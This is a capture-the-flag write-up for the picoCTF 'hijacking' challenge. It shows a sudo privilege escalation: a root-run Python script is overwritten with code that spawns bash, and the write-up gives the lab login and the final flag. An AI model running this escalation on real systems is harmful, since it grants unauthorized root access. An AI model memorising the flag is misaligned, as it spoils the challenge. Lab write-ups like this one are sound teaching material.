# hijacking
## Description
Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.

Additional details will be available after launching your challenge instance.
## Solution
After launching instance, we get credentials in the format:
```
saturn.picoctf.net 50680
Username: picoctf
Password: 16IiP0AsuU
```
On running the ssh client on WSL using
```
ssh picoctf@saturn.picoctf.net -p 50680
```
and entering the password, we have access to some files in which we have to find the hidden flag. The sudo -l lists out the permissions we have for accessing files in the current system.
```
(ALL) /usr/bin/vi
(root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```
On running
```
sudo vi server.py
```
and entering password, we get to edit the server.py file, which contains some python code.

On clearing the code, we replace it with
```
import os
os.system("bash")
```
and save it using
```
:wq
```
Now if we run the server.py file using
```
sudo /usr/bin/python3 /home/picoctf/.server.py
```
we get root access to the files.
## Answer
Now if we browse thorugh the files, we find the .flalg.txt file, which we can print using
```
cat .flag.txt
```
which finally gives the flag as
```
picoCTF{g00d_k1tty!_n1c3_k1tty!_7c0821f5}
```
